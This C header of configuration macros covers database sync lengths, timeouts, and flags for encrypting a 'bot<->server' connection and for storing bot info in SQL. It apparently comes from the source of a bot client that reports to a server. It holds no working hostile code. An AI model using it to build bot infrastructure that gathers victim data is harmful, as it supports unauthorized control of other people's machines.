// Global configuration
#pragma once

// Disables syncing engine (debug only)
//#define _CONFIG_SYNC_DB_DISABLE

// Disables intial info packet; storage into info table
//#define _CONFIG_INTIAL_INFO_DISABLE

// The maximum module name length for the database sync id element
#define _CONFIG_SYNC_DB_MAX_NAME_LEN		64

// The maximum url length for the database sync id element
#define _CONFIG_SYNC_DB_MAX_URL_LEN			64

// Invalid sync id element value
#define _CONFIG_SYNC_DB_INVALID_ID			-1

// Sync command timeout
#define _CONFIG_SYNC_DB_TIMEOUT				10 // seconds

// Timeout for info response
#define _CONFIG_INFO_TIMEOUT				10 // seconds

// Uses encryption for bot<->server connection
#define _CONFIG_USE_ENCRYPTION

// Disables bot info appended to SQL database
#define _CONFIG_DISABLE_SQL_DATA